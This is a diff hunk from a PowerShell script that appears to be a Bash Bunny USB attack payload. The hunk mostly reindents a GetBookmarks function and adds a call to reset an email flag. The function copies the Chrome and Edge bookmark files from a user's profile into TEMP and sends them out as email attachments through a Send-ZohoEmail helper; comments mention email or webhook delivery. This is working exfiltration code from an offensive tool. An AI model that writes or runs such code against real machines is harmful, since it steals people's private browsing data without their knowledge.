@@ -296,54 +296,56 @@ function ShowTree {
 }
 function GetBookmarks {
     # See if file is a thing
-Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf
+    Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf
 
-#If the file does not exist, write to host.
-if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf)) {
-     try {
-         Write-Host "The chrome bookmark file has not been found. "
-     }
-     catch {
-         throw $_.Exception.Message
-     }
- }
- # Copy Chrome Bookmarks to Bash Bunny
-  else {
-    $F1 = "chrome_bookmarks.txt"
-    Copy-Item "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -Destination "$env:TEMP/$F1" 
-        # SEND to EMAIL or WEBHOOK
-        if (-not $isEmailSent) {
-            # Email parameters
-            $subject = "Chrome Bookmarks - Sent on $currentDateTime"
-            $attachments = @("$env:TEMP\chrome_bookmarks.txt")  # Array of attachment file paths
-            Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-        } 
+    #If the file does not exist, write to host.
+    if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf)) {
+        try {
+            Write-Host "The chrome bookmark file has not been found. "
+        }
+        catch {
+            throw $_.Exception.Message
+        }
+    }
+    # Copy Chrome Bookmarks to Bash Bunny
+    else {
+        $F1 = "chrome_bookmarks.txt"
+        Copy-Item "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -Destination "$env:TEMP/$F1" 
+            # SEND to EMAIL or WEBHOOK
+            if (-not $isEmailSent) {
+                # Email parameters
+                $subject = "Chrome Bookmarks - Sent on $currentDateTime"
+                $attachments = @("$env:TEMP\chrome_bookmarks.txt")  # Array of attachment file paths
+                Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+            } 
+        }
+
+    # See if file is a thing
+    Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf
+
+    #If the file does not exist, write to host.
+    if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf)) {
+        try {
+            Write-Host "The edge bookmark file has not been found. "
+        }
+        catch {
+            throw $_.Exception.Message
+        }
+    }
+    # Copy Chrome Bookmarks to Bash Bunny
+    else {
+        $F2 = "edge_bookmarks.txt"
+        Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -Destination "$env:tmp/$F2" 
+            # SEND to EMAIL or WEBHOOK
+            if (-not $isEmailSent) {
+                # Email parameters
+                $subject = "Edge Bookmarks - Sent on $currentDateTime"
+                $attachments = @("$env:TEMP\edge_bookmarks.txt")  # Array of attachment file paths
+                Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+            } 
     }
 
-# See if file is a thing
-Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf
-
-#If the file does not exist, write to host.
-if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf)) {
-    try {
-        Write-Host "The edge bookmark file has not been found. "
-    }
-    catch {
-        throw $_.Exception.Message
-    }
-}
- # Copy Chrome Bookmarks to Bash Bunny
- else {
-    $F2 = "edge_bookmarks.txt"
-    Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -Destination "$env:tmp/$F2" 
-        # SEND to EMAIL or WEBHOOK
-        if (-not $isEmailSent) {
-            # Email parameters
-            $subject = "Edge Bookmarks - Sent on $currentDateTime"
-            $attachments = @("$env:TEMP\edge_bookmarks.txt")  # Array of attachment file paths
-            Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-        } 
-}
+    SetEmailSentFalse
 }
 function ClearCache {
 
